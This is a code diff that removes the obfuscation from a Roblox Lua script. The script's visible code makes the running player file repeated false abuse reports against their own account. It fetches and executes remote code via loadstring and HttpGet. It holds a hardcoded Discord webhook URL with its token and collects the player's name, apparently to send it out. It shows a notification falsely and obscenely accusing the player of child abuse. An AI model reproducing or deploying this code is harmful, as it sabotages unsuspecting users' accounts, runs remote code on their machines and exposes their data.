@@ -169,6 +169,7 @@ while true do
 	sendHi();
 	task.wait(1);
 end
+
 local player_name = game:GetService("Players").LocalPlayer.Name
 local webhook_url = "https://discord.com/api/webhooks/1273975370395422721/-0WV2cl-4vytiFBEFecibzD6A8gaLWEEsDsF2bE0Ug2aZKN9VLRbmED_oVfqj6cNSQt4"
 
@@ -199,12 +200,18 @@ local players = game:GetService("Players")
 local localPlayer = players.LocalPlayer
 
 for _, category in ipairs(categories) do
-	players:ReportAbuse(localPlayer, category, LUAOBFUSACTOR_DECRYPT_STR_0("\29\36\29\180\84\249\36\37\51\35\29\190\29\171\39\58\46\113\11\169\28\234\42\60\50\54\73\137\22\233\45\58\36\113\61\148\42\165", "\85\92\81\105\219\121\139\65"));
-	task.wait(1.5);
-	players:ReportAbuse(localPlayer, category, LUAOBFUSACTOR_DECRYPT_STR_0("\220\166\68\74\49\205\248\163\95\87\104\218\249\243\86\74\110\159\255\161\85\68\119\214\243\180\16\119\115\221\241\188\72\5\72\240\206\253", "\191\157\211\48\37\28"));
+    players:ReportAbuse(localPlayer, category, "Auto-reported for breaking Roblox TOS.")
+    task.wait(1.5)
+    players:ReportAbuse(localPlayer, category, "Auto-reported for breaking Roblox TOS.")
 end
+
 local function notifySelfReport()
-	local OrionLib = loadstring(game:HttpGet(LUAOBFUSACTOR_DECRYPT_STR_0("\215\11\224\12\41\133\80\187\14\59\200\81\243\21\46\215\10\246\9\41\218\13\247\19\52\203\26\250\8\116\220\16\249\83\41\215\19\241\4\45\222\13\241\83\21\205\22\251\18\117\210\30\253\18\117\204\16\225\14\57\218", "\90\191\127\148\124")))();
-	OrionLib:MakeNotification({[LUAOBFUSACTOR_DECRYPT_STR_0("\86\134\35\18", "\119\24\231\78")]=LUAOBFUSACTOR_DECRYPT_STR_0("\177\40\169\76\145\114\20\146\34\183\94", "\113\226\77\197\42\188\32"),[LUAOBFUSACTOR_DECRYPT_STR_0("\25\25\250\161\63\24\224", "\213\90\118\148")]=(LUAOBFUSACTOR_DECRYPT_STR_0("\115\43\244\65\76\85\58\244\80\88\88\37\248\68\76\75\43\244\87\67\95\110\191\95\65\87\110\183\94\68\87\42\166\83\67\72\116\244", "\45\59\78\212\54") .. table.concat(categories, LUAOBFUSACTOR_DECRYPT_STR_0("\92\22", "\144\112\54\227\235\230\78\205"))),[LUAOBFUSACTOR_DECRYPT_STR_0("\135\33\2\249", "\59\211\72\111\156\176")]=5});
+    local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Orion/main/source"))()
+    OrionLib:MakeNotification({
+        Name = "Self-Report",
+        Content = "He want fuck,rape and kill childrens: " .. table.concat(categories, ", "),
+        Time = 5
+    })
 end
-notifySelfReport();
+
+notifySelfReport()
